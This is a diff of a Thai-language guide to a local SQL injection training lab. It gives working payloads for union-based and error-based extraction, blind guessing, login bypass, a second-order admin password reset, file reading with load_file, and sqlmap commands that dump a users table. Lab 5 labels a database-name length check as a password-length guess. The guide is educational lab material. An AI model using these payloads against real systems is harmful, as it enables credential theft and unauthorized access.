@@ -1,99 +1,155 @@
 ================================================================
-คู่มือการทดลอง SQL INJECTION TRAINING LAB (ภาษาไทย)
+SQL INJECTION TRAINING LAB: OFFICIAL GUIDE (ฉบับปรับปรุง)
 ================================================================
-หมายเหตุ: ไฟล์นี้รวบรวมขั้นตอนการทดลองและ Payload สำหรับการเรียนรู้
-กรุณาทำตามขั้นตอนทีละขั้นเพื่อทำความเข้าใจช่องโหว่แต่ละแบบ
+ระดับความยาก: Beginner - Intermediate
+คำเตือน: ใช้เพื่อการศึกษาใน Lab จำลองเท่านั้น ห้ามนำไปใช้กับเว็บไซต์จริง
+
 ================================================================
 
 [ LAB 1: Union-Based SQL Injection ]
-เป้าหมาย: ดึงข้อมูลจากตารางอื่น (เช่น ตาราง users) โดยใช้คำสั่ง UNION
+Concept: การใช้คำสั่ง UNION เพื่อเชื่อมผลลัพธ์จากตารางอื่น (เช่น users) 
+มาแสดงผลร่วมกับหน้าเว็บปกติ
 
 ขั้นตอนที่ 1: ไปที่เมนู "Technology" (Lab 1)
-ขั้นตอนที่ 2: ลองใส่ Article ID ปกติ (เช่นเลข 1) เพื่อดูผลลัพธ์
-ขั้นตอนที่ 3: ทดสอบช่องโหว่โดยพิมพ์เครื่องหมาย single quote: '
-ขั้นตอนที่ 4: หาจำนวนคอลัมน์ (ลองสุ่มเลขไปเรื่อยๆ จนกว่าจะ Error):
-            1 ORDER BY 1 # (ผ่าน)
-            1 ORDER BY 2 # (ผ่าน)
-            1 ORDER BY 3 # (ผ่าน)
-            1 ORDER BY 4 # (Error -> แสดงว่ามีแค่ 3 คอลัมน์)
-ขั้นตอนที่ 5: ใช้ UNION เพื่อดึงข้อมูลชื่อฐานข้อมูล:
-            0 UNION SELECT 1, database(), user() #
-ขั้นตอนที่ 6: ดึงชื่อผู้ใช้และรหัสผ่านจากตาราง users:
-            0 UNION SELECT 1, username, password FROM users #
 
+ขั้นตอนที่ 2: หาจำนวนคอลัมน์ (ต้องรู้ว่าตารางหลักมีกี่ห้อง ถึงจะ Union ได้)
+- ลองใส่: 1 ORDER BY 1 # (ผ่าน)
+- ลองใส่: 1 ORDER BY 3 # (ผ่าน)
+- ลองใส่: 1 ORDER BY 4 # (Error! -> แสดงว่ามีแค่ 3 คอลัมน์)
 
-[ LAB 2: Automated SQL Injection ]
-เป้าหมาย: ใช้เครื่องมือ sqlmap ในการเจาะระบบอัตโนมัติ
+ขั้นตอนที่ 3: หาจุดแสดงผล (ดูว่าเลขไหนโผล่บนหน้าเว็บ)
+Payload:
+    0 UNION SELECT 1, 2, 3 #
+(สังเกต: เลข 2 และ 3 โผล่มาบนหน้าเว็บ แปลว่าเราแทรกข้อมูลตรงนี้ได้)
 
-ขั้นตอนที่ 1: ไปที่เมนู "Archive" (Lab 2)
-ขั้นตอนที่ 2: เปิด Terminal หรือ CMD
-ขั้นตอนที่ 3: สั่ง sqlmap เพื่อดูรายชื่อฐานข้อมูล:
-            sqlmap -u "http://localhost:8080/lab_auto.php?id=1" --batch --dbs
-ขั้นตอนที่ 4: ดูรายชื่อตารางในฐานข้อมูล 'sqli_lab':
-            sqlmap -u "http://localhost:8080/lab_auto.php?id=1" -D sqli_lab --tables --batch
-ขั้นตอนที่ 5: ดูดข้อมูลทั้งหมดในตาราง 'users':
-            sqlmap -u "http://localhost:8080/lab_auto.php?id=1" -D sqli_lab -T users --dump --batch
+ขั้นตอนที่ 4: ดูชื่อฐานข้อมูลและเวอร์ชัน
+Payload:
+    0 UNION SELECT 1, database(), version() #
 
+ขั้นตอนที่ 5: (สำคัญ!) หาชื่อ "ตาราง" ทั้งหมดในระบบ
+Payload:
+    0 UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database() #
+(ผลลัพธ์: คุณจะเห็นชื่อตาราง users โผล่มา)
+
+ขั้นตอนที่ 6: หาชื่อ "คอลัมน์" ในตาราง users
+Payload:
+    0 UNION SELECT 1, group_concat(column_name), 3 FROM information_schema.columns WHERE table_name='users' #
+
+ขั้นตอนที่ 7: ดูดข้อมูล (Username/Password)
+Payload:
+    0 UNION SELECT 1, username, password FROM users #
+
+================================================================
+
+[ LAB 2: Automated SQL Injection (SQLMap) ]
+Concept: การใช้เครื่องมือทุ่นแรงเพื่อเจาะระบบแบบรวดเร็ว (ต้องเปิด Terminal)
+หมายเหตุ: หาก Lab มีการล็อกรหัส (Basic Auth) ให้เพิ่ม --auth-type=Basic --auth-cred="admin:password"
+
+ขั้นตอนที่ 1: ตรวจสอบรายชื่อฐานข้อมูล (Databases)
+Command:
+    sqlmap -u "http://localhost:8080/lab_auto.php?id=1" --batch --dbs
+
+ขั้นตอนที่ 2: เจาะดูชื่อตาราง (Tables) ในฐานข้อมูลเป้าหมาย
+Command:
+    sqlmap -u "http://localhost:8080/lab_auto.php?id=1" -D sqli_lab --tables --batch
+
+ขั้นตอนที่ 3: ดูดข้อมูลทั้งหมด (Dump) จากตาราง users
+Command:
+    sqlmap -u "http://localhost:8080/lab_auto.php?id=1" -D sqli_lab -T users --dump --batch
+
+================================================================
 
 [ LAB 3: Authentication Bypass ]
-เป้าหมาย: เข้าสู่ระบบเป็น Admin โดยไม่ต้องรู้รหัสผ่าน
+Concept: การใช้ SQL Comment เพื่อตัดจบคำสั่งตรวจสอบรหัสผ่าน 
+ทำให้เข้าระบบได้โดยไม่ต้องรู้ Password
 
 ขั้นตอนที่ 1: ไปที่เมนู "Login" (Lab 3)
-ขั้นตอนที่ 2: ลอง Login มั่วๆ ดูก่อนเพื่อให้เห็นว่าเข้าไม่ได้
-ขั้นตอนที่ 3: ในช่อง Username ให้ใส่ Payload นี้:
-            admin' #
-ขั้นตอนที่ 4: ในช่อง Password ใส่อะไรก็ได้ (เช่น 1234)
-ขั้นตอนที่ 5: กด Login -> ระบบจะพาเข้าสู่หน้า Admin ทันที!
 
+ขั้นตอนที่ 2: ช่อง Username ให้ใส่ Payload:
+Payload:
+    admin' #
+
+ขั้นตอนที่ 3: ช่อง Password ใส่อะไรก็ได้ (เช่น 1234)
+
+ขั้นตอนที่ 4: กด Login -> ระบบจะพาเข้าสู่หน้า Admin ทันที!
+(อธิบาย: โค้ดหลังบ้านจะกลายเป็น SELECT * FROM users WHERE user='admin' #' AND pass='...')
+
+================================================================
 
 [ LAB 4: Error-Based SQL Injection ]
-เป้าหมาย: ดึงข้อมูลโดยการอ่านจาก Error Message ของฐานข้อมูล
+Concept: การจงใจทำให้ Database แจ้ง Error เพื่อให้มันคายข้อมูลความลับออกมาพร้อมข้อความ Error นั้น
 
 ขั้นตอนที่ 1: ไปที่เมนู "Support" (Lab 4)
-ขั้นตอนที่ 2: ลองทำให้ระบบ Error โดยใส่เครื่องหมาย:
-            '
-ขั้นตอนที่ 3: สังเกตข้อความ Error สีแดงที่แจ้งเตือนมาจาก MySQL
-ขั้นตอนที่ 4: ยิง Payload เพื่อดึง Version ของฐานข้อมูลผ่าน Error:
-            1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e)) #
-ขั้นตอนที่ 5: ยิง Payload เพื่อดึงชื่อฐานข้อมูล:
-            1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e)) #
 
+ขั้นตอนที่ 2: ยิง Payload เพื่อดูชื่อฐานข้อมูล
+Payload:
+    ' AND extractvalue(1,concat(0x3a,database())) #
+(ผลลัพธ์: ดูที่ Error สีแดง จะมีคำว่า :sqli_lab)
+
+ขั้นตอนที่ 3: ยิง Payload เพื่อดูชื่อ "ตารางแรก"
+Payload:
+    ' AND extractvalue(1,concat(0x3a,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1))) #
+
+ขั้นตอนที่ 4: ยิง Payload เพื่อดูชื่อ "ตารางที่สอง" (เปลี่ยน LIMIT)
+Payload:
+    ' AND extractvalue(1,concat(0x3a,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1))) #
+
+================================================================
 
 [ LAB 5: Blind SQL Injection ]
-เป้าหมาย: เดาข้อมูลโดยการถามคำถาม ใช่/ไม่ใช่ (True/False) กับฐานข้อมูล
+Concept: เมื่อหน้าเว็บไม่โชว์ Error และไม่โชว์ข้อมูล เราต้องเล่นเกม "ถาม-ตอบ" (Yes/No) แทน
 
 ขั้นตอนที่ 1: ไปที่เมนู "Offers" (Lab 5)
-ขั้นตอนที่ 2: ใส่รหัสคูปองที่ถูกต้อง (เลข 1) -> ระบบตอบ "Valid"
-ขั้นตอนที่ 3: ทดสอบเงื่อนไขที่เป็น "จริง" (ต้องได้ผลลัพธ์ Valid เหมือนเดิม):
-            1 AND 1=1
-ขั้นตอนที่ 4: ทดสอบเงื่อนไขที่เป็น "เท็จ" (ผลลัพธ์ต้องเปลี่ยนไป หรือหาไม่เจอ):
-            1 AND 1=2
-ขั้นตอนที่ 5: ลองเดาความยาวของ Version (ต้องเดาเองทีละตัว):
-            1 AND LENGTH(VERSION()) > 5
 
+ขั้นตอนที่ 2: เช็คว่าคุยกับ Database รู้เรื่องไหม
+- ใส่: 1 AND 1=1 -> ผลลัพธ์: Valid (แสดงว่า Database ตอบรับ)
+- ใส่: 1 AND 1=2 -> ผลลัพธ์: User Not Found (แสดงว่าเงื่อนไขเท็จทำงาน)
+
+ขั้นตอนที่ 3: ทายชื่อ Database "ตัวอักษรแรก"
+- ทายว่าคือตัว 'a' ใช่ไหม?: 
+  1 AND substring(database(),1,1) = 'a' (ผล: Not Found)
+- ทายว่าคือตัว 's' ใช่ไหม?: 
+  1 AND substring(database(),1,1) = 's' (ผล: Valid)
+
+ขั้นตอนที่ 4: เดาความยาวของรหัสผ่าน
+Payload:
+    1 AND length(database()) > 5
+
+================================================================
 
 [ LAB 6: Second-Order SQL Injection ]
-เป้าหมาย: เปลี่ยนรหัสผ่านของ Admin ตัวจริง โดยการสมัครสมาชิกชื่อปลอม
+Concept: การวาง "ระเบิดเวลา" ฝัง Code อันตรายไว้ใน Database 
+แล้วรอให้ Admin/ระบบ เรียกใช้นามแฝงนั้น คำสั่งถึงจะทำงาน
 
 ขั้นตอนที่ 1: ไปที่เมนู "HR Portal" (Lab 6)
-ขั้นตอนที่ 2: สมัครสมาชิกใหม่ (Register) โดยตั้งชื่อ Username ว่า:
-            admin' #
-            (รหัสผ่านตั้งอะไรก็ได้ เช่น "1234")
-ขั้นตอนที่ 3: Login ด้วย User ที่เพิ่งสมัคร ("admin' #")
-ขั้นตอนที่ 4: ไปที่เมนู "Reset Password"
-ขั้นตอนที่ 5: เปลี่ยนรหัสผ่านใหม่เป็น "hacked123"
-            * ด้วยผลของ SQL Injection ในชื่อเรา คำสั่งจะกลายเป็น:
-              UPDATE users SET password='...' WHERE username='admin' #'
-            * ซึ่งมันไปตรงกับเงื่อนไขของ Admin ตัวจริงพอดี!
-ขั้นตอนที่ 6: Logout ออกจากระบบ
-ขั้นตอนที่ 7: ลอง Login ID "admin" ด้วยรหัส "hacked123" -> เข้าได้สำเร็จ!
 
+ขั้นตอนที่ 2: สมัครสมาชิกใหม่ (Register) ตั้ง Username ว่า:
+Payload:
+    admin' #
+(รหัสผ่านตั้งอะไรก็ได้)
 
-[ LAB 9: File Read/Write (Transparency) ]
-เป้าหมาย: แอบอ่านไฟล์ความลับในเครื่อง Server
+ขั้นตอนที่ 3: Login ด้วย User ที่เพิ่งสมัคร
+
+ขั้นตอนที่ 4: ไปที่เมนู "Reset Password" เปลี่ยนรหัสใหม่เป็น hacked123
+
+ขั้นตอนที่ 5: Logout ออกมา แล้วลอง Login เข้า ID "admin" (ตัวจริง) ด้วยรหัส hacked123
+(ผลลัพธ์: เข้าได้! เพราะตอนเปลี่ยนรหัส ระบบดึงชื่อ admin' # ไปใช้ ทำให้รหัสของ admin ตัวจริงถูกเปลี่ยนแทน)
+
+================================================================
+
+[ LAB 9: File Read (Transparency) ]
+Concept: การใช้ UNION เพื่ออ่านไฟล์ความลับในเครื่อง Server (เช่น /etc/passwd)
+หมายเหตุ: Lab 9 นี้จำลองการอ่านไฟล์ DB (LOAD_FILE)
 
 ขั้นตอนที่ 1: ไปที่เมนู "Transparency" (Lab 9)
-ขั้นตอนที่ 2: ใส่ ID ปกติ: 1
-ขั้นตอนที่ 3: ยิง Payload เพื่อขโมยข้อมูลจากตารางเอกสารลับ 'secret_documents':
-            0 UNION SELECT 1, filename, content FROM secret_documents
-ขั้นตอนที่ 4: สังเกตผลลัพธ์ด้านล่าง จะมีเอกสารลับ (confidential.txt) โผล่ขึ้นมาต่อท้ายเนียนๆ
+
+ขั้นตอนที่ 2: ลองใส่ ID: 1
+
+ขั้นตอนที่ 3: ยิง Payload เพื่อขโมยข้อมูลจากตารางลับ
+Payload:
+    0 UNION SELECT 1, filename, content FROM secret_documents
+
+ขั้นตอนที่ 4: (Advanced) ลองอ่านไฟล์ Config ลับที่ซ่อนไว้ (Safe Target)
+Payload:
+    0 UNION SELECT 1, 'File Hack', load_file('/var/www/html/server_secret.ini')
+(ผลลัพธ์: จะได้ไฟล์ Config จำลองที่มีรหัสผ่านปลอม ไม่ต้องยุ่งกับไฟล์ระบบจริง)
